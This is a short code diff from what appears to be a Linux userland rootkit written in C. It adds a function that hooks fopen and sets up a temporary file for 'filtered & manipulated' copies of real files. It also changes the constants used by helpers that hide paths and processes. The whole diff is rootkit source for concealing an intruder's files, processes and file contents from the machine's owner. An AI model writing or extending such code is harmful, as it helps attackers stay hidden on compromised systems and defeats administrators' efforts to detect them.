@@ -91,6 +91,26 @@ off_t getablocksize(off_t fsize){
     return blksize;
 }
 
+// opens pathname for reading. the pointer tmp is a tmpfile() meant for filtered & manipulated contents of pathname.
+// if either fopen call fails NULL is returned & the calling function decides what to do.
+FILE *redirstream(const char *pathname, FILE **tmp){
+    FILE *fp;
+
+    hook(CFOPEN);
+
+    fp = call(CFOPEN, pathname, "r");
+    if(fp == NULL)
+        return NULL;
+
+    *tmp = tmpfile();
+    if(*tmp == NULL){
+        fclose(fp);
+        return NULL;
+    }
+
+    return fp;
+}
+
 /* lstat on path. pointers fsize & mode are updated with st_size & st_mode.
  * fopen called on path for reading.
  * fopen called on newpath for writing a (likely tampered with) copy.
@@ -129,8 +149,8 @@ int _hidden_path(const char *pathname, short mode);
 int _f_hidden_path(int fd, short mode);
 int _l_hidden_path(const char *pathname, short mode);
 int hidden_proc(pid_t pid);
-#define MODE_REG 0x32  /* STAT MODE FOR REGULAR FILES. */
-#define MODE_64  0x64  /* STAT MODE FOR BIG FILES. */
+#define MODE_REG 0
+#define MODE_64  1
 #define hidden_ppid(pid)     hidden_proc(getppid())
 #define hidden_path(path)    _hidden_path(path, MODE_REG)
 #define hidden_path64(path)  _hidden_path(path, MODE_64)
